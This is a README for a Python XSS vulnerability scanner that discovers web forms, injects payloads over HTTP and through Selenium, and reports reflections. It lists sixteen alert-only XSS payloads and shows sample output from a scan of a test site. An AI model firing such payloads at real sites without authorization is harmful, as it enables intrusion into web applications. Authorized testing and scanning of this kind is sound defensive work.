# Advanced XSS Scanner

A powerful and comprehensive Cross-Site Scripting (XSS) vulnerability scanner that combines HTTP request testing with Selenium WebDriver for accurate detection and proof-of-concept generation.

## Features

- **Dual Testing Approach**: Uses both HTTP requests and Selenium WebDriver for comprehensive testing
- **Form Discovery**: Automatically discovers forms and input fields on target websites
- **Payload Reflection Detection**: Detects when XSS payloads are reflected in server responses
- **Multiple Payload Types**: Tests various XSS payload types including script tags, event handlers, and HTML elements
- **Screenshot Capture**: Takes screenshots when XSS vulnerabilities are confirmed (with Selenium)
- **Comprehensive Logging**: Detailed logging with color-coded output for easy analysis
- **Error Handling**: Robust error handling and fallback mechanisms

## Installation

### Prerequisites

- Python 3.7+
- Chrome browser
- ChromeDriver

### Dependencies

```bash
pip install requests selenium webdriver-manager
```

### ChromeDriver Setup

The scanner will automatically download and manage ChromeDriver, but you can also install it manually:

```bash
# Ubuntu/Debian
sudo apt-get install chromium-chromedriver

# Or download from https://chromedriver.chromium.org/
```

## Usage

```bash
python3 xss_scanner.py <target_url>
```

### Example

```bash
python3 xss_scanner.py http://testphp.vulnweb.com
```

## How It Works

1. **Form Discovery**: Scans the target website for HTML forms and input fields
2. **Payload Generation**: Creates various XSS payloads for testing
3. **HTTP Testing**: Sends POST/GET requests with XSS payloads and checks for reflection
4. **Selenium Testing**: Uses Chrome WebDriver to test payloads in a real browser environment
5. **Vulnerability Confirmation**: Confirms XSS vulnerabilities through reflection detection and alert handling
6. **Screenshot Capture**: Takes screenshots when vulnerabilities are confirmed

## Payload Types

The scanner tests various XSS payload types:

- `<script>alert("XSS")</script>`
- `<img src=x onerror=alert("XSS")>`
- `<svg onload=alert("XSS")>`
- `<iframe src="javascript:alert('XSS')">`
- `<body onload=alert("XSS")>`
- `<input onfocus=alert("XSS") autofocus>`
- `<details open ontoggle="alert('XSS')">`
- `<video><source onerror="alert('XSS')">`
- `<audio src=x onerror=alert("XSS")>`
- `<object data="javascript:alert('XSS')">`
- `<embed src="javascript:alert('XSS')">`
- `<form><button formaction="javascript:alert('XSS')">`
- `<marquee onstart="alert('XSS')">`
- `<keygen onfocus=alert("XSS") autofocus>`
- `<select onfocus=alert("XSS") autofocus>`
- `<textarea onfocus=alert("XSS") autofocus>`

## Output

The scanner provides detailed output including:

- Form discovery results
- Payload testing progress
- Vulnerability confirmations
- Screenshot paths (when available)
- Summary of found vulnerabilities

## Example Output

```
🚀 Starting XSS scan on: http://testphp.vulnweb.com
🔍 Found form: http://testphp.vulnweb.com/search.php?test=query (post) with inputs: ['searchFor', 'goButton']
📋 Total forms discovered: 3
✅ Selenium WebDriver initialized successfully
🔍 Testing form: http://testphp.vulnweb.com/search.php?test=query
💉 Testing payload: <script>alert("XSS")</script>
✅ Payload reflected in response: <script>alert("XSS")</script>
🎯 XSS FOUND! URL: http://testphp.vulnweb.com/search.php?test=query
💉 Payload: <script>alert("XSS")</script>
📊 Scan completed. Found 48 vulnerabilities:
```

## Security Notice

This tool is designed for authorized security testing only. Always ensure you have proper permission before testing any website. Unauthorized testing may violate laws and terms of service.

## License

This project is for educational and authorized security testing purposes only.

## Contributing

Feel free to submit issues and enhancement requests!